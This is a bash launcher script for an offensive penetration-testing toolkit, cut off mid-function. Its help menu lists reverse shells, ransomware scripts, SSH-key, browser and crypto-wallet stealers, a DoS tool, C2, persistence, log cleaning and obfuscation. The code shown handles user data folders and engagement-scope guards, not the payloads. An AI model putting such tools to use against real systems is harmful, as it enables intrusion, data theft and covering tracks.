#!/bin/bash

#############################
#/    Author: Adam Hamilton
#/    Created Date: Friday-July-10-2026
#/    Time: 5:55-pm
#/    Purpose: Main script in the CyberSecurityToolKit tool set
#/    Url: https://github.com/adamhamilton44/CyberSecurityToolKit
#/    Version: v3.0.5
#############################
#/
#/    NAME:
#/                 cstk - A multi functional tool kit for hackers in multiple phases of an engagement
#/
#/    SYNOPSIS:
#/                 cstk [class option] [tool]
#/
#/    DESCRIPTION:
#/                 class option must be ARG1 and can take long or short form.
#/
#/    OPTIONS:
#/                 -O, --osint
#/                         run a tool from the osint class
#/                 -P, --payload
#/                         run a tool from the payload class
#/                 -X, --postx
#/                         run a tool from the post exploit class
#/                 -E, --etc
#/                         run a tool from the etc class
#/                 -H, --help
#/                         short form help shows a short help menu, long form help shows a full help menu
#/                 -V, --version
#/                         short form shows version number only, long form shows full version number
#/                 -T, --tty
#/                         display the guide for upgrading a basic Linux shell to a full TTY
#/                 -C, --check-updates
#/                         check CSTK-managed packages and repositories for available updates
#/                 -U, --update
#/                         check and interactively update CSTK-managed packages and repositories
#/                 -D, --defense
#/                         open the read-only defensive assessment tools
#/                 --private-data
#/                         manage the current user's private Loot, Malware, Logs, and logging preference
#/                 --control {engagements|inventory|tcp-connect}
#/                         use the installed loopback-only CSTK control API client as the invoking user
#/                 --refresh-hashes
#/                         interactively authorize and rebuild the local integrity manifest
#/                 -G, --engagements
#/                         manage engagements, scope, lifecycle and guarded operations
#/                 --use ID [class tool]
#/                         select an active engagement for this process
#/    TOOLS:
#//D  DEFENSE CLASS:          -D | --defense
#//D  l | --linux-audit         Linux Security Audit (requires its separately supplied executable)
#//D  w | --web-tls             Read-only Web/TLS assessment; requires an explicit HTTP/HTTPS URL
#//O
#//O  OSINT CLASS:            -O | --osint
#//O  ------------------------------------------------------------------------------------------
#//O  nmap help                n | --nmap        nmap helper + slower ping sweeper
#//O  ipsweeper                s | --sweep       very fast IP sweeper (last octet 1-255)
#//O  iplookup                 f | --findip      find geolocation, ISP, open ports, and possible vulnerabilities of an IP address
#//O  auto enumerate           e | --enum        automated website enumeration
#//O  email parser             b | --breached    check breached emails/password combos
#//O  dorks helper             g | --google      Google dorks helper (7k+ entries, fzf)
#//O  social email search      m | --email       search 100+ social sites for an email address
#//O  passwd attack tool       p | --pass        offline/online password cracking helper
#//O  auto vuln finder         v | --vuln        automated vulnerability checks
#//O  username generator       u | --username    generate a number of usernames from a source id
#//O  ssh enumeration          h | --ssh         enumeration script of remote host on port 22
#//O  firewall detection       w | --waf         check an online web server for a firewall or IDS
#//O
#//P
#//P  PAYLOAD CLASS:          -P |  --payload
#//P  ------------------------------------------------------------------------------------------
#//P  netcat payloads          n | --netcat     create a netcat binding/reverse shell script
#//P  linux reverse shell      v | --revshell   multiple Linux reverse shells wrapped into a single script and attempts to use them 1 by 1
#//P  ransomware scripts       r | --ransom     encryption/decryption ransomware scripts
#//P  reverse shells (all)     p | --revall     many reverse shells options for multiple os's with encoding and encryption
#//P  no touch payload         t | --notouch    in-memory payloads that avoid touching disk
#//P  DoS bomb attack          b | --bomb       memory-overload helper (DoS)
#//P  SSH stealer              s | --ssh        collect and tamper with SSH keys
#//P  metasploit payloads      m | --msf        msfvenom/metasploit helper
#//P  apk embedding            a | --apk        embed payload into APK
#//P  Command and Control      c | --cnc        command and control server for access to remote targets with payload options
#//P
#//X
#//X  POST EXPLOIT CLASS:     -X | --postx
#//X  ------------------------------------------------------------------------------------------
#//X  on start                 s | --onstart    add a command to run on reboot
#//X  files of interest        i | --foi        search for interesting files on linux systems
#//X  in memory audit          e | --inmemory   best-effort audit for recoverable passwords in supported live processes
#//X  check for VM             v | --vm         did i gain a shell on a virtual machine
#//X  browser thief            b | --browser    extract cookies/passwords/bookmarks/downloads/addons from a webbrowser
#//X  crypto thief             c | --crypto     search for crypto wallet patterns on disk (regex)
#//X  gtfo bugs                g | --gtfo       check permissive file permissions for escalation
#//X  bruteforce               f | --force      brute-force a protected archives (zip,7z,rar)
#//X  linux exploit kit        k | --kernel     check kernel for known exploits and fetch PoCs
#//X
#//E
#//E  ETC CLASS:              -E | --etc
#//E  ------------------------------------------------------------------------------------------
#//E  array encrypt            a | --array      create obfuscated shell scripts using arrays
#//E  extract arch             x | --extract    extract many archive type files (zip,tar,7z,deb,..)
#//E  webserver                w | --webserver  start a simple web server (python/php/apache)
#//E  users and shells         u | --users      list users and their default shells
#//E  openssl helper           o | --openssl    hashing, keys, encrypt/decrypt helpers
#//E  gpg lookalike            l | --lookalike  create a secret message that looks like a gpg key
#//E  create binary            e | --exe        turn a Bash script into an unreadable binary executable
#//E  log cleaning tool        c | --clean      helper scripts to clean selected logs
#//E  hash identify            h | --hashid     attempts to identify the hash type from user input or a file
#//E  post exploit kit         z | --zip        create a zip-protected post-exploitation toolkit for user who gained a shell
#//E  arsenal-ng               g | --ng         use the current systems arsenal of tools to your advantage with syntax and usage help
#//E  AI analyst               i | --ai         defensive model-assisted analysis without autonomous tools or shell access
#//E
#//S
#//S  Examples:
#//S  [ sudo cstk -Dw https://example.com/ ] Web/TLS assessment
#//S  [ sudo cstk --defense --web-tls https://example.com/ ] Web/TLS assessment
#//S  [ sudo cstk -Dl ] OR [ sudo cstk --defense --linux-audit ] Linux audit
#//S  [ sudo cstk --engagements ] Manage engagements and guarded operations
#//S  [ sudo cstk --use ID ] Select an active engagement for the menu session
#//S  [ sudo cstk -On ] OR  [ sudo cstk --osint --nmap      ]  Run OSINT nmap helper
#//S  [ sudo cstk -Pn ] OR  [ sudo cstk --payload --netcat  ]  Run payload netcat helper
#//S  [ sudo cstk -Xe ] OR  [ sudo cstk --postx --inmemory  ]  Run the best-effort live-memory password audit
#//S  [ sudo cstk -Ea ] OR  [ sudo cstk --etc --array       ]  Run etc array encoder
#//S  [ sudo cstk -T  ] OR  [ sudo cstk --tty               ]  Display the TTY shell upgrade guide
#//S  [ sudo cstk -C  ] OR  [ sudo cstk --check-updates     ]  Check for CSTK-managed updates
#//S  [ sudo cstk -U  ] OR  [ sudo cstk --update             ]  Check and install approved updates
#//S  [ sudo cstk --private-data                            ]  Manage private Loot, Malware, Logs, and backups
#//S  [ sudo cstk --control engagements                       ]  List local API engagement records
#//S
#//V  v3.0.5
#//W  version: 3.0.5
#/

IFS=$'\n\t'
umask 077
[[ $UID -ne 0 ]] && { echo "Run as root" && exit 2 ; }
if [[ -t 1 ]]; then
    R=$'\e[38;2;255;5;215m' # red
    G=$'\e[38;2;5;255;5m' # green
    Y=$'\e[38;2;245;255;25m' # yellow
    B=$'\e[38;2;0;135;135m' # blue
    P=$'\e[38;2;185;25;185m' # purple
    g=$'\e[38;2;125;125;125m' # gray
    O=$'\e[38;2;255;60;60m' # orange
    D=$'\e[38;2;0;80;60m' # dark
    C=$'\e[38;2;185;60;30m' # cyan
    X=$'\e[0m' # reset
    R="${R:-$'\e[1;31m'}" # default to 16 color red if 255 color unavailable
    G="${G:-$'\e[1;32m'}" # "" green
    Y="${Y:-$'\e[1;33m'}" # "" yellow
    B="${B:-$'\e[1;34m'}" # "" blue
    P="${P:-$'\e[1;35m'}" # "" purple
    C="${C:-$'\e[1;36m'}" # "" cyan
    O="${O:-$'\e[1;37m'}" # "" orange
    D="${D:-$'\e[1;38m'}" # "" dark
    g="${g:-$'\e[1;39m'}" # "" gray
else
    R="" # else NO COLOR
    G=""
    Y=""
    B=""
    P=""
    g=""
    O=""
    D=""
    C=""
    X=""
fi
AA=" ==> " # base folder CyberSecurityToolKit
AO="Osint ==> " # /Osint
AP="Payloads ==> " # /Payload
AX="Post Exploit ==> " # /PostEx
AE="Etc ==> " # /Etc
user=$(echo "${SUDO_USER:-$(whoami)}") # USER NAME
DATE=$(date) # Today's DATE
if [ -h /usr/local/bin/cstk ]; then
    home_dir="$(dirname "$(realpath /usr/local/bin/cstk)")" # soft link to true directory of cstk
else
    home_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)" # print the directory path of cstk home
fi
export home_dir  # allow cstk home directory for all scripts

security_checks="$home_dir/Other/SecurityChecks" # directory for security checking user password and sha256sum files of cstk executables
config_file="$security_checks/.auth_config" # config file to store user option login
fonts_config_file="$security_checks/.fonts_config" # config file to store the animated header option
hash_file="$security_checks/.hash_list.txt" # user chosen password hashed
log=""                            # initialized to the invoking user's private Logs directory
bin="$home_dir/scripts/bin"      # where all the exe files are located
lib="$home_dir/scripts/lib"      # where all the library files are located
. "$lib/arguments_frame"         # source the arguments frame shown before each script runs
if [[ -r "$lib/Fonts" ]]; then
    . "$lib/Fonts"               # optional animated startup headers
fi
cstk_wrapper="/usr/local/bin/cstk_wrapper" # wrapper script used for a temporary PATH environment to bin directory
lib_decryption_key="/etc/cstk/lib_decryption.key"
readonly integrity_refresh_key_sha256="085515d0891eb35f61637a371e4d3fafea04e5ae714180a1fb3324ab91f42073"

initialize_user_context() {
    local passwd_record

    passwd_record="$(getent passwd "$user")" || {
        echo -e "${R}[ ERROR ] Unable to find the invoking user's account: $user${X}" >&2
        return 1
    }

    IFS=: read -r _ _ _ _ _ user_home _ <<<"$passwd_record"
    user_home="$(realpath -e "$user_home")" || return 1
    user_group="$(id -gn "$user")" || return 1

    if [[ -z "$user_home" || "$user_home" != /* || ! -d "$user_home" ]]; then
        echo -e "${R}[ ERROR ] The invoking user does not have a usable home directory.${X}" >&2
        return 1
    fi

    CSTK_USER_DATA_DIR="$user_home/.local/share/cstk"
    CSTK_LOOT_DIR="$CSTK_USER_DATA_DIR/Loot"
    CSTK_MALWARE_DIR="$CSTK_USER_DATA_DIR/Malware"
    CSTK_LOG_DIR="$CSTK_USER_DATA_DIR/Logs"
    CSTK_KEYS_DIR="$CSTK_USER_DATA_DIR/Keys"
    CSTK_LOG_CONFIG="$CSTK_USER_DATA_DIR/.logging_enabled"
    cstk_export_dir="$user_home/CSTK-Exports"
    Loot="$CSTK_LOOT_DIR"
    Malware="$CSTK_MALWARE_DIR"
    Keys="$CSTK_KEYS_DIR"
    log="$CSTK_LOG_DIR"

    if [[ -r "$CSTK_LOG_CONFIG" ]]; then
        IFS= read -r CSTK_LOGGING_LEVEL < "$CSTK_LOG_CONFIG"
    else
        CSTK_LOGGING_LEVEL="basic"
    fi
    [[ "$CSTK_LOGGING_LEVEL" == "on" ]] && CSTK_LOGGING_LEVEL="basic"
    if [[ "$CSTK_LOGGING_LEVEL" != "basic" &&
          "$CSTK_LOGGING_LEVEL" != "full" &&
          "$CSTK_LOGGING_LEVEL" != "off" ]]; then
        CSTK_LOGGING_LEVEL="basic"
    fi
    if [[ "$CSTK_LOGGING_LEVEL" == "off" ]]; then
        CSTK_LOGGING_ENABLED="off"
    else
        CSTK_LOGGING_ENABLED="on"
    fi

    export user user_home CSTK_USER_DATA_DIR CSTK_LOOT_DIR CSTK_MALWARE_DIR CSTK_LOG_DIR CSTK_KEYS_DIR
    export CSTK_LOG_CONFIG CSTK_LOGGING_ENABLED CSTK_LOGGING_LEVEL Loot Malware Keys log
}

run_as_cstk_user() {
    if [[ "$user" == "root" ]]; then
        "$@"
    elif command -v runuser >/dev/null 2>&1; then
        runuser -u "$user" -- "$@"
    else
        sudo -u "$user" -- "$@"
    fi
}

secure_user_data_permissions() {
    [[ -n "${CSTK_USER_DATA_DIR:-}" && -d "$CSTK_USER_DATA_DIR" ]] || return 0
    [[ ! -L "$CSTK_USER_DATA_DIR" ]] || return 1

    chown -R -P -- "$user:$user_group" "$CSTK_USER_DATA_DIR" || return 1
    chmod -R go-rwx -- "$CSTK_USER_DATA_DIR" || return 1
    chmod 700 -- "$CSTK_USER_DATA_DIR" "$Loot" "$Malware" "$CSTK_LOG_DIR" "$Keys"
    if [[ -f "$CSTK_LOG_CONFIG" ]]; then
        chmod 600 -- "$CSTK_LOG_CONFIG"
    fi
}

prepare_user_data_dirs() {
    local data_path

    if [[ "$(realpath -m "$CSTK_USER_DATA_DIR")" != "$CSTK_USER_DATA_DIR" ]]; then
        echo -e "${R}[ ERROR ] The private CSTK data path must stay inside the user home directory.${X}" >&2
        return 1
    fi

    for data_path in "$CSTK_USER_DATA_DIR" "$Loot" "$Malware" "$CSTK_LOG_DIR" "$Keys"; do
        if [[ -L "$data_path" ]]; then
            echo -e "${R}[ ERROR ] Refusing a symbolic link in the private CSTK data path: $data_path${X}" >&2
            return 1
        fi
    done

    if ! run_as_cstk_user mkdir -p -- "$Loot" "$Malware" "$CSTK_LOG_DIR" "$Keys"; then
        echo -e "${R}[ ERROR ] Unable to create private CSTK data folders.${X}" >&2
        return 1
    fi

    for data_path in "$CSTK_USER_DATA_DIR" "$Loot" "$Malware" "$CSTK_LOG_DIR" "$Keys"; do
        if [[ ! -d "$data_path" || -L "$data_path" ]]; then
            echo -e "${R}[ ERROR ] Unsafe private CSTK data path: $data_path${X}" >&2
            return 1
        fi
    done

    if [[ ! -f "$CSTK_LOG_CONFIG" ]]; then
        printf 'basic\n' > "$CSTK_LOG_CONFIG" || return 1
    fi

    secure_user_data_permissions || {
        echo -e "${R}[ ERROR ] Unable to secure the private CSTK data folders.${X}" >&2
        return 1
    }
}

set_runtime_logging() {
    local choice
    echo "Choose runtime logging detail:"
    echo "1 - Off"
    echo "2 - Basic metadata (recommended)"
    echo "3 - Full command output and arguments (may contain secrets)"
    read -r -p "Logging level ==> " choice
    case "$choice" in
        1|off) CSTK_LOGGING_LEVEL="off" ;;
        2|basic) CSTK_LOGGING_LEVEL="basic" ;;
        3|full)
            echo -e "${Y}[ WARNING ] Full logs may store credentials, tokens, targets, and tool output.${X}"
            read -r -p "Enable full logging? [y/N]: " choice
            [[ "$choice" =~ ^[Yy]$ ]] || return 0
            CSTK_LOGGING_LEVEL="full"
            ;;
        *) echo -e "${Y}Choose 1, 2, or 3.${X}"; return 2 ;;
    esac

    printf '%s\n' "$CSTK_LOGGING_LEVEL" > "$CSTK_LOG_CONFIG" || {
        echo -e "${R}[ ERROR ] Unable to save the runtime logging preference.${X}" >&2
        return 1
    }
    if [[ "$CSTK_LOGGING_LEVEL" == "off" ]]; then
        CSTK_LOGGING_ENABLED="off"
    else
        CSTK_LOGGING_ENABLED="on"
    fi
    export CSTK_LOGGING_ENABLED CSTK_LOGGING_LEVEL
    secure_user_data_permissions || return 1
    echo -e "${G}[ OK ] Runtime tool logging level is now $CSTK_LOGGING_LEVEL.${X}"
}

runtime_logging_enabled() {
    [[ "$CSTK_LOGGING_LEVEL" != "off" ]]
}

prepare_export_dir() {
    if [[ "$(realpath -m "$cstk_export_dir")" != "$cstk_export_dir" ]]; then
        echo -e "${R}[ ERROR ] The CSTK export path must stay inside the user home directory.${X}" >&2
        return 1
    fi
    if [[ -L "$cstk_export_dir" ]]; then
        echo -e "${R}[ ERROR ] Refusing symbolic-link export folder: $cstk_export_dir${X}" >&2
        return 1
    fi

    run_as_cstk_user mkdir -p -- "$cstk_export_dir" || return 1
    [[ -d "$cstk_export_dir" && ! -L "$cstk_export_dir" ]] || return 1
    run_as_cstk_user chmod 700 -- "$cstk_export_dir"
}

copy_legacy_bank_data() {
    local answer copied source destination
    local legacy_loot="$home_dir/Bank/Loot"
    local legacy_malware="$home_dir/Bank/Malware"

    if [[ ! -d "$legacy_loot" && ! -d "$legacy_malware" ]]; then
        echo -e "${Y}[ INFO ] No legacy Bank/Loot or Bank/Malware folders were found.${X}"
        return 0
    fi

    echo -e "${Y}This copies legacy shared files into $CSTK_USER_DATA_DIR.${X}"
    echo "Existing private files will not be overwritten, and the originals will remain untouched."
    read -r -p "Continue? [y/N]: " answer
    [[ "$answer" =~ ^[Yy]$ ]] || return 0

    copied="no"
    for source in "$legacy_loot" "$legacy_malware"; do
        [[ -d "$source" ]] || continue
        if [[ "$source" == "$legacy_loot" ]]; then
            destination="$Loot"
        else
            destination="$Malware"
        fi
        cp -a --no-clobber -- "$source/." "$destination/" || return 1
        copied="yes"
    done

    secure_user_data_permissions || return 1
    if [[ "$copied" == "yes" ]]; then
        echo -e "${G}[ OK ] Legacy files copied without overwriting private files.${X}"
    fi
}

create_private_data_archive() {
    local format archive stamp archiver
    format="$1"
    stamp="$(date +%Y%m%d-%H%M%S-%N)"

    secure_user_data_permissions || return 1
    prepare_export_dir || {
        echo -e "${R}[ ERROR ] Unable to prepare $cstk_export_dir.${X}" >&2
        return 1
    }

    case "$format" in
        plain)
            archive="$cstk_export_dir/cstk-private-data-$stamp.tar.gz"
            if ! run_as_cstk_user tar --create --gzip --file "$archive" \
                --directory "$CSTK_USER_DATA_DIR" Loot Malware Logs Keys Engagements; then
                rm -f -- "$archive"
                return 1
            fi
            ;;
        encrypted)
            archiver="$(command -v 7z || command -v 7zz || true)"
            if [[ -z "$archiver" ]]; then
                echo -e "${R}[ ERROR ] 7-Zip is not installed. Run the CSTK installer, then try again.${X}" >&2
                return 1
            fi
            archive="$cstk_export_dir/cstk-private-data-$stamp.7z"
            echo -e "${Y}7-Zip will ask twice for a password. The password is not stored by CSTK.${X}"
            if ! (
                cd -- "$CSTK_USER_DATA_DIR" &&
                run_as_cstk_user "$archiver" a -t7z -mhe=on -p "$archive" Loot Malware Logs Keys Engagements
            ); then
                rm -f -- "$archive"
                return 1
            fi
            ;;
        *)
            return 2
            ;;
    esac

    if [[ ! -f "$archive" || -L "$archive" ]]; then
        echo -e "${R}[ ERROR ] The backup was not created as a safe regular file.${X}" >&2
        return 1
    fi
    run_as_cstk_user chmod 600 -- "$archive" || return 1
    echo -e "${G}[ OK ] Private backup created: $archive${X}"
}

private_data_menu() {
    local choice

    if [[ ! -t 0 || ! -t 1 ]]; then
        echo -e "${R}[ ERROR ] The private-data manager requires an interactive terminal.${X}" >&2
        return 2
    fi

    while true; do
        clear
        echo -e "${O}CSTK Private User Data${X}"
        echo
        echo "User:       $user"
        echo "Loot:       $Loot"
        echo "Malware:    $Malware"
        echo "Keys:       $Keys"
        echo "Logs:       $CSTK_LOG_DIR"
        echo "Logging:    $CSTK_LOGGING_LEVEL"
        echo "Backups:    $cstk_export_dir"
        echo
        echo "Other ordinary users cannot access these mode-700 folders."
        echo "Root and accounts with sudo privileges can still access system data."
        echo
        echo "1 - Reapply private ownership and permissions"
        echo "2 - Copy legacy shared Bank files here (no overwrite)"
        echo "3 - Create a private .tar.gz backup"
        echo "4 - Create a password-protected .7z backup (recommended)"
        echo "5 - Set runtime logging detail (off/basic/full)"
        echo "X - Return"
        echo
        read -r -p "Private Data ==> " choice

        case "$choice" in
            1) secure_user_data_permissions &&
               echo -e "${G}[ OK ] Private permissions reapplied.${X}" ;;
            2) copy_legacy_bank_data ;;
            3) create_private_data_archive plain ;;
            4) create_private_data_archive encrypted ;;
            5) set_runtime_logging ;;
            [Xx]) return 0 ;;
            *) echo -e "${Y}Choose 1, 2, 3, 4, 5, or X.${X}" ;;
        esac

        echo
        read -r -p "Press Enter to continue..."
    done
}

finish_cstk_session() {
    local rc=$?
    stop_engagement_hud
    tput csr 0 "$(( $(tput lines 2>/dev/null || echo 24) - 1 ))" 2>/dev/null || true
    trap - EXIT
    secure_user_data_permissions >/dev/null 2>&1 || true
    exit "$rc"
}

initialize_user_context || exit 1
CSTK_ENGAGEMENTS_DIR="$CSTK_USER_DATA_DIR/Engagements"
engagement_helper="$bin/Etc_engagement"
# Caller-provided selection variables cannot establish an engagement session.
unset CSTK_ENGAGEMENT_ID CSTK_ENGAGEMENT_SLUG CSTK_ENGAGEMENT_DIR CSTK_ENGAGEMENT_STATE
unset CSTK_SCOPE_REVISION CSTK_SCOPE_SHA256 CSTK_SESSION_ID CSTK_STANDALONE_LAB
export CSTK_ENGAGEMENTS_DIR
run_engagement_helper() {
    if [[ ! -x "$engagement_helper" || -L "$engagement_helper" ]]; then
        echo -e "${R}[ ERROR ] CSTK engagement manager not found: $engagement_helper${X}" >&2
        return 1
    fi
    run_as_cstk_user env HOME="$user_home" USER="$user" LOGNAME="$user" \
        "$engagement_helper" --root "$CSTK_ENGAGEMENTS_DIR" "$@"
}

apply_engagement_selection() {
    local identifier selection_output key value

    identifier="$1"
    selection_output="$(run_engagement_helper select "$identifier" --format tsv)" || return 1

    while IFS=$'\t' read -r key value; do
        case "$key" in
            CSTK_ENGAGEMENT_ID) CSTK_ENGAGEMENT_ID="$value" ;;
            CSTK_ENGAGEMENT_SLUG) CSTK_ENGAGEMENT_SLUG="$value" ;;
            CSTK_ENGAGEMENT_DIR) CSTK_ENGAGEMENT_DIR="$value" ;;
            CSTK_ENGAGEMENT_STATE) CSTK_ENGAGEMENT_STATE="$value" ;;
            CSTK_SCOPE_REVISION) CSTK_SCOPE_REVISION="$value" ;;
            CSTK_SCOPE_SHA256) CSTK_SCOPE_SHA256="$value" ;;
            CSTK_SESSION_ID) CSTK_SESSION_ID="$value" ;;
            CSTK_LOOT_DIR) CSTK_LOOT_DIR="$value" ;;
            CSTK_MALWARE_DIR) CSTK_MALWARE_DIR="$value" ;;
            CSTK_LOG_DIR) CSTK_LOG_DIR="$value" ;;
            CSTK_EVIDENCE_DIR) CSTK_EVIDENCE_DIR="$value" ;;
            CSTK_REPORT_DIR) CSTK_REPORT_DIR="$value" ;;
            CSTK_AUDIT_DIR) CSTK_AUDIT_DIR="$value" ;;
            CSTK_RUNS_DIR) CSTK_RUNS_DIR="$value" ;;
            CSTK_TEMP_DIR) CSTK_TEMP_DIR="$value" ;;
            *)
                echo -e "${R}[ ERROR ] Unexpected engagement selection field: $key${X}" >&2
                return 1
                ;;
        esac
    done <<< "$selection_output"

    if [[ -z "$CSTK_ENGAGEMENT_ID" || -z "$CSTK_ENGAGEMENT_DIR" ||
          -z "$CSTK_SCOPE_REVISION" || -z "$CSTK_SCOPE_SHA256" ||
          "$CSTK_ENGAGEMENT_STATE" != "active" ]]; then
        echo -e "${R}[ ERROR ] The engagement selection was incomplete or inactive.${X}" >&2
        return 1
    fi

    CSTK_KEYS_DIR="$CSTK_ENGAGEMENT_DIR/Keys"
    [[ ! -L "$CSTK_KEYS_DIR" ]] || { echo "Unsafe engagement Keys directory" >&2; return 1; }
    run_as_cstk_user mkdir -p -- "$CSTK_KEYS_DIR" || return 1
    Keys="$CSTK_KEYS_DIR"
    export CSTK_KEYS_DIR Keys
    Loot="$CSTK_LOOT_DIR"
    Malware="$CSTK_MALWARE_DIR"
    log="$CSTK_LOG_DIR"
    unset CSTK_STANDALONE_LAB
    export CSTK_ENGAGEMENT_ID CSTK_ENGAGEMENT_SLUG CSTK_ENGAGEMENT_DIR
    export CSTK_ENGAGEMENT_STATE CSTK_SCOPE_REVISION CSTK_SCOPE_SHA256 CSTK_SESSION_ID
    export CSTK_LOOT_DIR CSTK_MALWARE_DIR CSTK_LOG_DIR CSTK_EVIDENCE_DIR CSTK_REPORT_DIR
    export CSTK_AUDIT_DIR CSTK_RUNS_DIR CSTK_TEMP_DIR Loot Malware log

    secure_user_data_permissions || {
        echo -e "${R}[ ERROR ] Unable to secure the selected engagement workspace.${X}" >&2
        return 1
    }
    start_engagement_hud
    echo -e "${G}[ OK ] Engagement selected for this CSTK session: $CSTK_ENGAGEMENT_SLUG"
    echo -e "${g}Revision $CSTK_SCOPE_REVISION (${CSTK_SCOPE_SHA256:0:12})${X}"
}

choose_engagement_for_session() {
    local identifier

    if [[ ! -t 0 || ! -t 1 ]]; then
        echo -e "${R}[ ERROR ] A non-interactive run must specify --use ENGAGEMENT_ID.${X}" >&2
        return 2
    fi
    while true; do
        clear
        echo -e "${O}CSTK Engagement Selection${X}"
        echo
        run_engagement_helper list --format table || return 1
        echo
        echo "Enter an active engagement slug or ID."
        echo "C - Create/manage engagements"
        echo "X - Exit"
        read -r -p "Engagement ==> " identifier
        case "$identifier" in
            [Cc]) engagement_manager_menu ;;
            [Xx]) return 2 ;;
            "") continue ;;
            *) apply_engagement_selection "$identifier" && return 0 ;;
        esac
        echo
        read -r -p "Press Enter to continue..."
    done
}

engagement_manager_menu() {
    local choice identifier state config_path

    if [[ ! -t 0 || ! -t 1 ]]; then
        echo -e "${R}[ ERROR ] Engagement management requires an interactive terminal.${X}" >&2
        return 2
    fi
    while true; do
        clear
        echo -e "${O}CSTK Engagement Manager${X}"
        echo
        run_engagement_helper list --format table || return 1
        echo
        show_engagement_status || true
        echo "C - Create a draft with the guided questionnaire"
        echo "U - Use an active engagement for this session"
        echo "P - Pause the selected engagement"
        echo "N - Guarded TCP port check (explicit IP/CIDR, max 256 addresses)"
        echo "W - Guarded HTTP(S) request (scope checked on every redirect)"
        echo "I - Inspect the current revision"
        echo "V - Validate activation requirements"
        echo "S - Change state (ready/active/paused/closed/archived)"
        echo "R - Create a new revision from a reviewed JSON file"
        echo "X - Return"
        echo
        read -r -p "Engagement Manager ==> " choice
        case "$choice" in
            [Uu])
                read -r -p "Engagement slug or ID: " identifier
                apply_engagement_selection "$identifier"
                ;;
            [Pp])
                [[ -n "${CSTK_ENGAGEMENT_SLUG:-}" ]] && run_engagement_helper transition "$CSTK_ENGAGEMENT_SLUG" paused
                ;;
            [Nn]) run_guarded_operation tcp ;;
            [Ww]) run_guarded_operation web ;;
            [Cc]) run_engagement_helper create ;;
            [Ii])
                read -r -p "Engagement slug or ID: " identifier
                run_engagement_helper show "$identifier"
                ;;
            [Vv])
                read -r -p "Engagement slug or ID: " identifier
                run_engagement_helper validate "$identifier"
                ;;
            [Ss])
                read -r -p "Engagement slug or ID: " identifier
                read -r -p "New state: " state
                run_engagement_helper transition "$identifier" "$state"
                ;;
            [Rr])
                read -r -p "Engagement slug or ID: " identifier
                read -r -p "Reviewed JSON file path: " config_path
                run_engagement_helper revise "$identifier" --config "$config_path"
                ;;
            [Xx]) return 0 ;;
            *) echo -e "${Y}Choose C, I, V, S, R, or X.${X}" ;;
        esac
        echo
        read -r -p "Press Enter to continue..."
    done
}

stop_engagement_hud() {
    if [[ -n "${CSTK_HUD_PID:-}" ]]; then
        kill "$CSTK_HUD_PID" 2>/dev/null || true
        wait "$CSTK_HUD_PID" 2>/dev/null || true
        unset CSTK_HUD_PID
    fi
}

start_engagement_hud() {
    stop_engagement_hud
    if [[ -n "${CSTK_ENGAGEMENT_SLUG:-}" && -t 1 ]]; then
        if [[ "$user" == root ]]; then
            "$engagement_helper" --root "$CSTK_ENGAGEMENTS_DIR" hud "$CSTK_ENGAGEMENT_SLUG" &
        else
            runuser -u "$user" -- "$engagement_helper" --root "$CSTK_ENGAGEMENTS_DIR" hud "$CSTK_ENGAGEMENT_SLUG" &
        fi
        CSTK_HUD_PID=$!
    fi
}

show_engagement_status() {
    if [[ -n "${CSTK_ENGAGEMENT_SLUG:-}" ]]; then
        run_engagement_helper status "$CSTK_ENGAGEMENT_SLUG"
    elif [[ "${CSTK_STANDALONE_LAB:-}" == 1 ]]; then
        echo "STANDALONE LAB | NO ENGAGEMENT SCOPE ENFORCEMENT"
    else
        echo "ENGAGEMENT: none selected | G: engagement | L: standalone lab (unguarded)"
    fi
}

# Every CSTK clear/redraw restores the current engagement status.
clear() {
    local rows
    rows="$(tput lines 2>/dev/null || echo 24)"
    tput csr 0 "$((rows - 1))" 2>/dev/null || true
    command clear 2>/dev/null || true
    if [[ -n "${CSTK_ENGAGEMENT_ID:-}" && -t 1 && "$rows" -ge 16 ]]; then
        # Reserve the top six rows across CSTK menus and ordinary terminal output.
        show_engagement_status | head -n 6 | cut -c "1-$(tput cols 2>/dev/null || echo 80)"
        tput csr 6 "$((rows - 1))" 2>/dev/null || true
        tput cup 6 0 2>/dev/null || true
    else
        show_engagement_status || true
    fi
}

select_standalone_lab() {
    local answer
    [[ -z "${CSTK_ENGAGEMENT_ID:-}" ]] || { echo "Exit this session before entering standalone lab mode."; return 1; }
    echo "Standalone lab mode has NO engagement scope enforcement. Do not use it for client engagements."
    read -r -p "Type LAB to enable legacy tools for this session: " answer
    [[ "$answer" == LAB ]] || return 1
    export CSTK_STANDALONE_LAB=1
}

engagement_dispatch_guard() {
    local tool="$1"
    if [[ -z "${CSTK_ENGAGEMENT_ID:-}" && "${CSTK_STANDALONE_LAB:-}" == 1 ]]; then
        return 0
    fi
    case "$tool" in
        cstk_ai_analyst|google_dorks|username_gen|users_and_shells|extract_arch|r_b_g_wrapper|gpg_lookalike_wrapper|hash_id|create_exe_binary|post_x_2_go|array_enc_script)
            if [[ -n "${CSTK_ENGAGEMENT_SLUG:-}" ]]; then
                show_engagement_status || return 1
            fi
            return 0 ;;
    esac
    echo "STOP: $tool has no engagement-safe adapter. Use G for guarded TCP or web operations."
    echo "Legacy tools cannot run through CSTK until their targets, redirects, and limits are enforced."
    return 1
}

run_guarded_operation() {
    local adapter="$1" target ports confirm
    [[ -n "${CSTK_ENGAGEMENT_SLUG:-}" ]] || { echo "Select an active engagement with G first."; return 1; }
    show_engagement_status || return 1
    read -r -p "Target (TCP: explicit IP/CIDR; web: full HTTP(S) URL): " target
    ports="443"
    if [[ "$adapter" == tcp ]]; then
        read -r -p "TCP ports, comma separated: " ports
    fi
    read -r -p "Authorize this one bounded operation within the recorded rules? Type RUN: " confirm
    [[ "$confirm" == RUN ]] || return 1
    stop_engagement_hud
    tput csr 0 "$(( $(tput lines 2>/dev/null || echo 24) - 1 ))" 2>/dev/null || true
    run_engagement_helper run "$CSTK_ENGAGEMENT_SLUG" --adapter "$adapter" --target "$target" --ports "$ports" --confirm
    local rc=$?
    clear
    start_engagement_hud
    return "$rc"
}


verify_integrity_refresh_key() {
    local supplied_hash

    supplied_hash="$(printf '%s' "$1" | sha256sum)" || return 1
    supplied_hash="${supplied_hash%% *}"
    [[ "$supplied_hash" == "$integrity_refresh_key_sha256" ]]
}

dec_file() {
    local encfile norm temp_output key_owner key_mode
    encfile="$1"
    norm="$2"

    if [[ -L "$lib_decryption_key" || ! -f "$lib_decryption_key" || ! -r "$lib_decryption_key" ]]; then
